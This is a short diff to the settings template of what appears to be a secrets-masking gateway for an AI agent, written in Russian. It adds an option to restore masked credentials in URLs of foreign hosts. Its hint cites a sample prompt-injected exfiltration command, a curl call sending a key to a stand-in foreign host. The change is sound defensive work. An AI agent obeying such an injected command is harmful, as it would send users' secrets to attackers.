@@ -107,6 +107,8 @@
         <label class="check"><input type="checkbox" name="ner" value="1"> Имена и организации (слой 4)</label>
         <label class="check"><input type="checkbox" name="llm" value="1"> Допроверка локальной моделью (слой 5)</label>
         <small class="hint">По умолчанию шлюз работает слоями 1–3 и словарём организации; слои 4 и 5 замедляют каждый ход агента</small>
+        <label class="check"><input type="checkbox" name="restore_foreign" value="1"> Восстанавливать секреты и учётные записи и в адресах чужих узлов</label>
+        <small class="hint">Без отметки пароль или учётная запись в адресе узла, которого нет в запросе агента и среди узлов чата (<code>curl https://чужой-узел/?k=…</code> из внедрённой инструкции), остаётся заменой; квитанция запроса это отмечает</small>
       </span></div>
       {% endif %}
       <div class="key-summary flash" data-key-summary role="status" aria-live="polite"></div>
